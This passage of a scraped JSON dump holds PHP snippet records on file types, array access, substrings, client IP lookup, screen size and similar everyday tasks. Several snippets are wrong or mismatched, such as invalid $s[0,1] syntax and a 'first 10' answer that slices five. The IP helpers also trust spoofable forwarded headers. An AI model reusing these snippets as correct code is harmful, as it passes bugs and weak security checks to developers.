explode(\" \", $match[2]);       foreach ($exts as $ext)       {         $mimes[$ext] = $match[1];       }     }   }   else   {     $mimes = array(       'txt' => 'text/plain',       'htm' => 'text/html',       'html' => 'text/html',       'php' => 'text/html',       'css' => 'text/css',       'js' => 'application/javascript',       'json' => 'application/json',       'xml' => 'application/xml',       'swf' => 'application/x-shockwave-flash',       'flv' => 'video/x-flv',       // images       'png' => 'image/png',       'jpe' => 'image/jpeg',       'jpeg' => 'image/jpeg',       'jpg' => 'image/jpeg',       'gif' => 'image/gif',       'bmp' => 'image/bmp',       'ico' => 'image/vnd.microsoft.icon',       'tiff' => 'image/tiff',       'tif' => 'image/tiff',       'svg' => 'image/svg+xml',       'svgz' => 'image/svg+xml',       // archives       'zip' => 'application/zip',       'rar' => 'application/x-rar-compressed',       'exe' => 'application/x-msdownload',       'msi' => 'application/x-msdownload',       'cab' => 'application/vnd.ms-cab-compressed',       // audio/video       'mp3' => 'audio/mpeg',       'qt' => 'video/quicktime',       'mov' => 'video/quicktime',       // adobe       'pdf' => 'application/pdf',       'psd' => 'image/vnd.adobe.photoshop',       'ai' => 'application/postscript',       'eps' => 'application/postscript',       'ps' => 'application/postscript',       // ms office       'doc' => 'application/msword',       'rtf' => 'application/rtf',       'xls' => 'application/vnd.ms-excel',       'ppt' => 'application/vnd.ms-powerpoint',       'docx' => 'application/msword',       'xlsx' => 'application/vnd.ms-excel',       'pptx' => 'application/vnd.ms-powerpoint',       // open office       'odt' => 'application/vnd.oasis.opendocument.text',       'ods' => 'application/vnd.oasis.opendocument.spreadsheet',     );   }   $content_mime = 'unknown';   if (is_file($content))   {     if (isset(pathinfo($content) ['extension']))     {       $content_ext = pathinfo($content) ['extension'];       if (isset($mimes[$content_ext]))       {         $content_mime = $mimes[$content_ext];       }       else       {         if (is_readable($content) && is_executable($content))         {           $finfo = finfo_open(FILEINFO_MIME_TYPE);           $content_mime = finfo_file($finfo, $content);           if ($content_mime === null | $content_mime === \"\")           {             $content_mime = \"application/octet-stream\";           }           else           {             $content_mime = $content_mime;           }           finfo_close($finfo);         }         else         {           $content_mime = \"application/octet-stream\";         }       }     }   }   else   {     // return whatever you want     // $content_mime = 'unknown';    }   $content_mime = $content_mime;   return $content_mime; } \n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3648,
    "keyword": null,
    "link": null,
    "title": " php get file type from url",
    "description": "$file_info = new finfo(FILEINFO_MIME_TYPE); $mime_type = $file_info->buffer(file_get_contents($image_url)); echo $mime_type; \n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3649,
    "keyword": null,
    "link": null,
    "title": " php get filename without extension",
    "description": "$ext = pathinfo($filename, PATHINFO_EXTENSION);\n// Here is a quick way of fetching only the filename (without extension) regardless of what suffix the file has.  // your file $file = 'image.jpg'; $info = pathinfo($file); // Before PHP 5.2 $file_name =  basename($file, '.'.$info['extension']); // After PHP 5.2 $file_name =  $info['filename'];\n// your file $file = 'image.jpg'; $info = pathinfo($file); // Before PHP 5.2 $file_name =  basename($file, '.'.$info['extension']); // After PHP 5.2 $file_name =  $info['filename'];\n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3650,
    "keyword": null,
    "link": null,
    "title": " php get filetype",
    "description": "//get image extension of uploaded file in php $imagetype = $_FILES['image']['name']; $ext = pathinfo($imagetype, PATHINFO_EXTENSION);// get file extension\n<?php echo filetype('/etc/passwd');  // file echo filetype('/etc/');        // dir ?>  \n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3651,
    "keyword": null,
    "link": null,
    "title": " php get first 10 elements of array",
    "description": "$sliced_array = array_slice($array, 0, 5) \narray_values($array)[0]; \n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\n$alphabet = array(\"a\", \"b\", \"c\", \"d\", \"e\",\"g\",\"h\",\"i\",\"j\",\"k\"); $firstFive = array_slice($alphabet, 0, 5); //get first 5 elements of array\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3652,
    "keyword": null,
    "link": null,
    "title": " php get first 5 characters of string",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\n$firstStringCharacter = substr(\"hello\", 0, 1);\n$newstring = substr($dynamicstring, -7);\n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3653,
    "keyword": null,
    "link": null,
    "title": " php get first character of string",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\nsubstr(\"testers\", -1); // returns \"s\"\n <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$firstStringCharacter = substr(\"hello\", 0, 1);\n$newstring = substr($dynamicstring, -7);\n$words = explode(\" \", $string);  $firstname = $words[0]; $lastname = $words[1]; $third_word = $words[2];\n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3654,
    "keyword": null,
    "link": null,
    "title": " php get first digit of number",
    "description": "// in case the number is a string $s = '123'; $a = $s[0];   echo $a; // 1  // in case the number is an integer  // Possibility 1 $k = 123; $s = $k.''; // or: $s = (string)$k; $a = $s[0];   echo $a; // 1   // Possibility 2 $k = 123; $a = floor($k/100); echo $a; // 1   // Possibility 3 $k = 123; $a = substr($k, 0, 1);  echo $a; // 1\n$s = '123'; $a = $s[0,1];   echo $a; \n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3655,
    "keyword": null,
    "link": null,
    "title": " php get first element of array",
    "description": "$firstKey = array_key_first($array);\n$sliced_array = array_slice($array, 0, 5) \n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\narray_shift(array_values($array)); \narray_pop(array_reverse($array)); \n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3656,
    "keyword": null,
    "link": null,
    "title": " php get first key of array",
    "description": "$firstKey = array_key_first($array);\narray_values($array)[0]; \n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\nFor PHP version 7 and above  $array = array(   \t\"1\" => \"PHP code tester Sandbox Online\",   \t\"foo\" => \"bar\", \t\"case\" => \"Random Stuff: \" . rand(100,999), \t\"PHP Version\" => phpversion() );               $firstValue = reset($colors); // PHP code tester Sandbox Online $firstKey = key($colors); // 1\n",
    "reg_date": "2021-10-12T10:18:22.000Z"
  },
  {
    "id": 3657,
    "keyword": null,
    "link": null,
    "title": " php get full url",
    "description": "$fullURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n//Get complete URL with http/https and GET parameters $complete_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n$actual_link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; \n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3658,
    "keyword": null,
    "link": null,
    "title": " php get hdd serial number",
    "description": "$serial =  shell_exec('wmic DISKDRIVE GET SerialNumber 2>&1');  echo  $serial;\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3659,
    "keyword": null,
    "link": null,
    "title": " php get hostname",
    "description": "<?php echo gethostname(); // may output e.g,: sandie  // Or, an option that also works before PHP 5.3 echo php_uname('n'); // may output e.g,: sandie ?>\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3660,
    "keyword": null,
    "link": null,
    "title": " php get hour",
    "description": "$hour = date('H:m:s'); echo $hour;\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3661,
    "keyword": null,
    "link": null,
    "title": " php get id from url",
    "description": "$id = (int)$_GET['id'];\n$path = parse_url($url, PHP_URL_PATH); $pathFragments = explode('/', $path); $end = end($pathFragments); \n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3662,
    "keyword": null,
    "link": null,
    "title": " php get intersection of arrays",
    "description": "$array1 = [1, 2]; $array2 = [2, 3, 4]; $commonValue = array_intersect($array1, $array2); //$commonValue = 2 // If you have X number of arrays you can do: $array1 = [1, 2]; $array2 = [2, 3, 4]; $arrayOfArrays = [$array1, $array2]; $commonValue = array_intersect(...$arrayOfArrays);\nfunction getArraysIntersection(a1,a2){      return  a1.filter(function(n) { return a2.indexOf(n) !== -1;});  }  var colors1 = [\"red\",\"blue\",\"green\"];  var colors2 = [\"red\",\"yellow\",\"blue\"];  var intersectingColors=getArraysIntersection(colors1, colors2); //[\"red\", \"blue\"]    \n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3663,
    "keyword": null,
    "link": null,
    "title": " php get intersection of two arrays",
    "description": "let arr1 = [0, 1, 2]; let arr2 = [3, 5, 7]; let primes = arr1.concat(arr2);  // > [0, 1, 2, 3, 5, 7]\n$array1 = [1, 2]; $array2 = [2, 3, 4]; $commonValue = array_intersect($array1, $array2); //$commonValue = 2 // If you have X number of arrays you can do: $array1 = [1, 2]; $array2 = [2, 3, 4]; $arrayOfArrays = [$array1, $array2]; $commonValue = array_intersect(...$arrayOfArrays);\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3664,
    "keyword": null,
    "link": null,
    "title": " php get ip address",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\n$_SERVER['REMOTE_ADDR']\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n// Function to get the client IP address function get_client_ip() {     $ipaddress = '';     if (getenv('HTTP_CLIENT_IP'))         $ipaddress = getenv('HTTP_CLIENT_IP');     else if(getenv('HTTP_X_FORWARDED_FOR'))         $ipaddress = getenv('HTTP_X_FORWARDED_FOR');     else if(getenv('HTTP_X_FORWARDED'))         $ipaddress = getenv('HTTP_X_FORWARDED');     else if(getenv('HTTP_FORWARDED_FOR'))         $ipaddress = getenv('HTTP_FORWARDED_FOR');     else if(getenv('HTTP_FORWARDED'))        $ipaddress = getenv('HTTP_FORWARDED');     else if(getenv('REMOTE_ADDR'))         $ipaddress = getenv('REMOTE_ADDR');     else         $ipaddress = 'UNKNOWN';     return $ipaddress; }\n//You can use an api: //Link to documentation: https://ip-get-geolocation.com/documentation/  $LocationArray = json_decode( file_get_contents('http://ip-get-geolocation.com/api/json/35.188.125.133'), true); \t  echo $LocationArray['country']; \t echo $LocationArray['city']; \t echo $LocationArray['region']; \t echo $LocationArray['timezone']; \n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3665,
    "keyword": null,
    "link": null,
    "title": " php get ip address of visitor",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n<?PHP  function getUserIP() {     // Get real visitor IP behind CloudFlare network     if (isset($_SERVER[\"HTTP_CF_CONNECTING_IP\"])) {               $_SERVER['REMOTE_ADDR'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];               $_SERVER['HTTP_CLIENT_IP'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];     }     $client  = @$_SERVER['HTTP_CLIENT_IP'];     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];     $remote  = $_SERVER['REMOTE_ADDR'];      if(filter_var($client, FILTER_VALIDATE_IP))     {         $ip = $client;     }     elseif(filter_var($forward, FILTER_VALIDATE_IP))     {         $ip = $forward;     }     else     {         $ip = $remote;     }      return $ip; }   $user_ip = getUserIP();  echo $user_ip; // Output IP address [Ex: 177.87.193.134]   ?>\n$ip = $_SERVER['REMOTE_ADDR']; $details = json_decode(file_get_contents(\"http://ipinfo.io/{$ip}/json\")); echo $details->city; // -> \"Mountain View\"\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3666,
    "keyword": null,
    "link": null,
    "title": " php get last digit of number",
    "description": "$number = 12356; $lastDigit = $number % 10; echo $lastDigit; // 6\n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3667,
    "keyword": null,
    "link": null,
    "title": " php get last modified date of file",
    "description": "$filename = 'somefile.txt'; if (file_exists($filename)) {     echo \"$filename last modified: \".date (\"F d Y H:i:s.\", filemtime($filename));   \t// somefile.txt was last changed: December 29 2020 22:16:23. } // filectime: when created // filemtime: last modified // fileatime: last accessed\nfast and \n",
    "reg_date": "2021-10-12T10:18:23.000Z"
  },
  {
    "id": 3668,
    "keyword": null,
    "link": null,
    "title": " php get latest file in directory",
    "description": "$files = scandir('data', SCANDIR_SORT_DESCENDING); $newest_file = $files[0];\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3669,
    "keyword": null,
    "link": null,
    "title": " php get location from ip address",
    "description": "$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n$ip = $_SERVER['REMOTE_ADDR']; $details = json_decode(file_get_contents(\"http://ipinfo.io/{$ip}/json\")); echo $details->city; // -> \"Mountain View\"\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3670,
    "keyword": null,
    "link": null,
    "title": " php get location of user",
    "description": "//Gets the IP Address from the visitor $PublicIP = $_SERVER['REMOTE_ADDR']; //Uses ipinfo.io to get the location of the IP Address, you can use another site but it will probably have a different implementation $json     = file_get_contents(\"http://ipinfo.io/$PublicIP/geo\"); //Breaks down the JSON object into an array $json     = json_decode($json, true); //This variable is the visitor's county $country  = $json['country']; //This variable is the visitor's region $region   = $json['region']; //This variable is the visitor's city $city     = $json['city'];\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3671,
    "keyword": null,
    "link": null,
    "title": " php get next saturday",
    "description": "echo date(\"Y-m-d\", strtotime(\"next Saturday\"));\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3672,
    "keyword": null,
    "link": null,
    "title": " php get object keys",
    "description": " <?php  class foo {     private $a;     public $b = 1;     public $c;     private $d;     static $e;         public function test() {         var_dump(get_object_vars($this));     } }  $test = new foo; var_dump(get_object_vars($test));  $test->test();  ?>  \n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3673,
    "keyword": null,
    "link": null,
    "title": " php get only numbers",
    "description": "$str = 'In My Cart : 11 items'; $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3674,
    "keyword": null,
    "link": null,
    "title": " php get only numbers from string",
    "description": "$str = preg_replace('/[^0-9.]+/', '', $str);\n$str = 'In My Cart : 11 items'; $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);\nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $outputString = preg_replace('/[^0-9]/', '', $string);   echo(\"The extracted numbers are: $outputString \\n\");  ?>  \nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $int = (int) filter_var($string, FILTER_SANITIZE_NUMBER_INT);   echo(\"The extracted numbers are: $int \\n\");  ?>  \n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3675,
    "keyword": null,
    "link": null,
    "title": " php get option value",
    "description": "<?php     if(isset($_POST['submit'])){     if(!empty($_POST['Fruit'])) {         $selected = $_POST['Fruit'];         echo 'You have chosen: ' . $selected;     } else {         echo 'Please select the value.';     }     } ?>\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3676,
    "keyword": null,
    "link": null,
    "title": " php get part of string",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\n <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$newstring = substr($dynamicstring, -7);\nsubstr ( $string , $start , $length  );  /**Returns the extracted part of string;   *or FALSE on failure, or an empty string   */\n<?php $str = \"Africa Beautiful!\"; echo substr($str, 0, 6);  // Outputs: Africa echo substr($str, 0, -10); // Outputs: Beautiful echo substr($str, 0);     // Outputs: Africa Beautiful! ?>\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3677,
    "keyword": null,
    "link": null,
    "title": " php get php.ini location from termina",
    "description": "php --ini\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3678,
    "keyword": null,
    "link": null,
    "title": " php get previous url",
    "description": "basename($_SERVER['HTTP_REFERER']);\n$_SERVER['HTTP_REFERER']\n//This should be on the previous page session_start(); $_SESSION[\"url\"] = \"the_url_of_page_we_want_to_get_back.php\";  //This should be on the current executing page session_start(); $previous_page_url = $_SESSION[\"url\"];\n",
    "reg_date": "2021-10-12T10:18:24.000Z"
  },
  {
    "id": 3679,
    "keyword": null,
    "link": null,
    "title": " php get query string",
    "description": "<?php \techo $_GET[\"query_name\"]; // url queries are stored in $_GET  ?>\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3680,
    "keyword": null,
    "link": null,
    "title": " php get random element from array",
    "description": "$items = array(1, 2, 3, 4, 5); echo $items[array_rand($items)];\n<?php //array_rand ( array $array [, int $num = 1 ] )  $input = array(\"Neo\", \"Morpheus\", \"Trinity\", \"Cypher\", \"Tank\"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . \"\\n\"; echo $input[$rand_keys[1]] . \"\\n\"; ?>  \n$array = [\"a\", \"b\", \"c\"]; $random = $array[ Rand(0, count($array)-1) ];  echo $random; // a or b or c\n$colors=[\"red\",\"blue\",\"green\",\"orange\"]; echo $colors[array_rand($colors)];//green (or any color randomly)\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3681,
    "keyword": null,
    "link": null,
    "title": " php get random value from array",
    "description": "$items = array(1, 2, 3, 4, 5); echo $items[array_rand($items)];\n$array = [\"a\", \"b\", \"c\"]; $random = $array[ Rand(0, count($array)-1) ];  echo $random; // a or b or c\n<?php //array_rand ( array $array [, int $num = 1 ] )  $input = array(\"Neo\", \"Morpheus\", \"Trinity\", \"Cypher\", \"Tank\"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . \"\\n\"; echo $input[$rand_keys[1]] . \"\\n\"; ?>  \n$colors=[\"red\",\"blue\",\"green\",\"orange\"]; echo $colors[array_rand($colors)];//green (or any color randomly)\n<?php $indexedArray = array(\"red\", \"blue\", \"green\", \"black\");  echo $indexedArray[0] . \"<br>\"; echo $indexedArray[1] . \"<br><br>\";  $array_random = array_rand($indexedArray, 2);  echo $indexedArray[$array_random[0]] . \"<br>\"; echo $indexedArray[$array_random[1]] . \"<br>\"; ?>\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3682,
    "keyword": null,
    "link": null,
    "title": " php get refferal",
    "description": "// To get what website the user came from: $_SERVER['HTTP_REFERER']\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3683,
    "keyword": null,
    "link": null,
    "title": " php get remote file last modified",
    "description": "<?php // outputs e.g.  somefile.txt was last modified: December 29 2002 22:16:23.  $filename = 'somefile.txt'; if (file_exists($filename)) {     echo \"$filename was last modified: \" . date (\"F d Y H:i:s.\", filemtime($filename)); } ?>\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3684,
    "keyword": null,
    "link": null,
    "title": " php get request header",
    "description": "// Since PHP 5.4.0 you can use getallheaders function which returns all request headers as an associative array:  var_dump(getallheaders());  // array(8) { //   [\"Accept\"]=> //   string(63) \"text/html[...]\" //   [\"Accept-Charset\"]=> //   string(31) \"ISSO-8859-1[...]\" //   [\"Accept-Encoding\"]=> //   string(17) \"gzip,deflate,sdch\" //   [\"Accept-Language\"]=> //   string(14) \"en-US,en;q=0.8\" //   [\"Cache-Control\"]=> //   string(9) \"max-age=0\" //   [\"Connection\"]=> //   string(10) \"keep-alive\" //   [\"Host\"]=> //   string(9) \"localhost\" //   [\"User-Agent\"]=> //   string(108) \"Mozilla/5.0 (Windows NT 6.1; WOW64) [...]\" // }\n There's a polyfill for this that can be downloaded or installed via composer:  https://github.com/ralouphie/getallheaders \n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3685,
    "keyword": null,
    "link": null,
    "title": " php get screen size",
    "description": "// jQUERY FILE  $(function() {     $.post('some_script.php', { width: screen.width, height:screen.height }, function(json) {         if(json.outcome == 'success') {             // do something with the knowledge possibly?         } else {             alert('Unable to let PHP know what the screen resolution is!');         }     },'json'); });  // PHP FILE  <?php // For instance, you can do something like this: if(isset($_POST['width']) && isset($_POST['height'])) {     $_SESSION['screen_width'] = $_POST['width'];     $_SESSION['screen_height'] = $_POST['height'];     echo json_encode(array('outcome'=>'success')); } else {     echo json_encode(array('outcome'=>'error','error'=>\"Couldn't save dimension info\")); } ?>\n//Save in cookie to access with $_COOKIE[\"screenXYZ\"];  //SetScreenResToCookie.php <?php if (isset($_POST)) {     echo \"success\";     setcookie(\"screenW\", $_POST[\"screenWidth\"], time() + (86400 * 30), '/');     setcookie(\"screenH\", $_POST[\"screenHeight\"], time() + (86400 * 30), '/'); } else {     echo \"Error. $\" . \"_POST array is not set!\"; } ?>    //where u need the Screen res(only a example):    //header.php //The function  <?php function screenResToCookie() {  if (isset($_SERVER[\"HTTP_X_FORWARDED_PROTO\"])) {         $http = $_SERVER[\"HTTP_X_FORWARDED_PROTO\"];     } else {         $http = $_SERVER[\"REQUEST_SCHEME\"];     }     $url = $http . \"://\" . $_SERVER[\"HTTP_HOST\"];     echo \"<script>         var damn = setInterval(() => {             var formData = {                 screenWidth: screen.width,                 screenHeight: screen.height             };              $.ajax({                 url: '\" . $url .\"/.../SetJScookie.php?\" . time() .\"',//This needs to be the URL on the domain u access the website from. ajax dont allow HTTPS                 type: 'POST',//because 'SetScreenResToCookie.php' use POST Array                 data: formData, //data in json format                 async: false, //enable or disable async (optional, but suggested as false if you need to populate data afterwards)                 success: function(response, textStatus, jqXHR) {                     console.log(response);                 },                 error: function(jqXHR, textStatus, errorThrown) {                     console.log(jqXHR);                     console.log(textStatus);                     console.log(errorThrown);                 }             });         }, 1000);     </script>\"; }  function ReturnHeader($..., $...) {   $Mobile = false;//If we dont wanne use Bootstrap or @media   screenResToCookie();//set the cookie for us   if (intval($_COOKIE[\"screenW\"]) < 735) {         $Mobile = true;     }      if ($Mobile) { \t//print header with mobile style(Dropdowns added or whatever)   } else {    //print header with Computer/Tablet style    } } ?>  \n//Save in cookie to access with $_COOKIE[\"screenXYZ\"];  //SetScreenResToCookie.php <?php if (isset($_POST)) {     echo \"success\";     setcookie(\"screenW\", $_POST[\"screenWidth\"], time() + (86400 * 30), '/');     setcookie(\"screenH\", $_POST[\"screenHeight\"], time() + (86400 * 30), '/'); } else {     echo \"Error. $\" . \"_POST array is not set!\"; } ?>    //where u need the Screen res(only a example):    //header.php //The function  <?php function screenResToCookie() {   if (isset($_SERVER[\"HTTP_X_FORWARDED_PROTO\"])) {         $http = $_SERVER[\"HTTP_X_FORWARDED_PROTO\"];     } else {         $http = $_SERVER[\"REQUEST_SCHEME\"];     }     $url = $http . \"://\" . $_SERVER[\"HTTP_HOST\"];     echo \"<script>         var damn = setInterval(() => {             var formData = {                 screenWidth: screen.width,                 screenHeight: screen.height             };              $.ajax({                 url: '\" . $url .\"/.../SetJScookie.php?\" . time() .\"',//This needs to be the URL on the domain u access the website from. ajax dont allow HTTPS                 type: 'POST',//because 'SetScreenResToCookie.php' use POST Array                 data: formData, //data in json format                 async: false, //enable or disable async (optional, but suggested as false if you need to populate data afterwards)                 success: function(response, textStatus, jqXHR) {                     console.log(response);                 },                 error: function(jqXHR, textStatus, errorThrown) {                     console.log(jqXHR);                     console.log(textStatus);                     console.log(errorThrown);                 }             });         }, 1000);     </script>\"; }  function ReturnHeader($..., $...) {   $Mobile = false;//If we dont wanne use Bootstrap or @media   screenResToCookie();//set the cookie for us   if (intval($_COOKIE[\"screenW\"]) < 735) {         $Mobile = true;     }      if ($Mobile) { \t//print header with mobile style(Dropdowns added or whatever)   } else {    //print header with Computer/Tablet style    } } ?>  \n<button onclick=\"myFunction()\">Try it</button>  <p id=\"demo\"></p>  <script> function myFunction() {   var x = \"Total Width: \" + screen.width + \"px\";   document.getElementById(\"demo\").innerHTML = x; } </script>\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3686,
    "keyword": null,
    "link": null,
    "title": " php get second last element of array",
    "description": "<?php  $source_array = ['key1' => 'value1', 'key2' => 'value2', 'key3' => 'value3'];  $result = end($source_array);  echo \"Last element: \".$result;  ?>\n$array = array(5,6,70,10,36,2); echo $array[count($array) -2]; \nend($arr)\n",
    "reg_date": "2021-10-12T10:18:25.000Z"
  },
  {
    "id": 3687,
    "keyword": null,
    "link": null,
    "title": " php get site metat tags",
    "description": "function getSiteOG( $url, $specificTags=0 ){   $doc = new DOMDocument();   @$doc->loadHTML(file_get_contents($url));   $res['title'] = $doc->getElementsByTagName('title')->item(0)->nodeValue;    foreach ($doc->getElementsByTagName('meta') as $m){       $tag = $m->getAttribute('name') ?: $m->getAttribute('property');       if(in_array($tag,['description','keywords']) || strpos($tag,'og:')===0) $res[str_replace('og:','',$tag)] = $m->getAttribute('content');   }   return $specificTags? array_intersect_key( $res, array_flip($specificTags) ) : $res; }\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3688,
    "keyword": null,
    "link": null,
    "title": " php get size of file",
    "description": "$fileSizeInBytes=filesize(\"/path/to/myfile.txt\"); \n$file = '/path/to/your/file'; $filesize = filesize($file);   echo \"The size of your file is $filesize bytes.\"; \n$img = get_headers(\"file URL\", 1); echo $img[\"Content-Length\"];\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3689,
    "keyword": null,
    "link": null,
    "title": " php get src content from image tag",
    "description": "$html = '<img id=\"12\" border=\"0\" src=\"/images/image.jpg\"          alt=\"Image\" width=\"100\" height=\"100\" />';  $doc = new DOMDocument(); $doc->loadHTML($html); $xpath = new DOMXPath($doc); $src = $xpath->evaluate(\"string(//img/@src)\"); # \"/images/image.jpg\"\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3690,
    "keyword": null,
    "link": null,
    "title": " php get start and end date of month and year",
    "description": "<?php  $query_date = '2010-02-04';  // First day of the month. echo date('Y-m-01', strtotime($query_date));  // Last day of the month. echo date('Y-m-t', strtotime($query_date));\n$startOfDay=date(\"Y-m-d 00:00:00\");\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3691,
    "keyword": null,
    "link": null,
    "title": " php get start of today",
    "description": "$beginOfDay = strtotime(\"today\"); //to format //$beginOfDay = date(\"Y-m-d H:i:s\",strtotime('today'));\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3692,
    "keyword": null,
    "link": null,
    "title": " php get string after character",
    "description": "$data = \"123_String\";     $whatIWant = substr($data, strpos($data, \"_\") + 1);     echo $whatIWant;\n$string = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla felis diam, mattis id elementum eget, ullamcorper et purus.\"; $prefix = \"Nulla\"; $index = strpos($string, $prefix) + strlen($prefix); $result = substr($string, $index); \n<?php $my_url = 'http://www.example.com/5478631'; echo substr($my_url, strrpos($my_url, '/' )+1).\"\\n\"; ?>   // print: 5478631\nsubstr(string,start,length)\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3693,
    "keyword": null,
    "link": null,
    "title": " php get string before character",
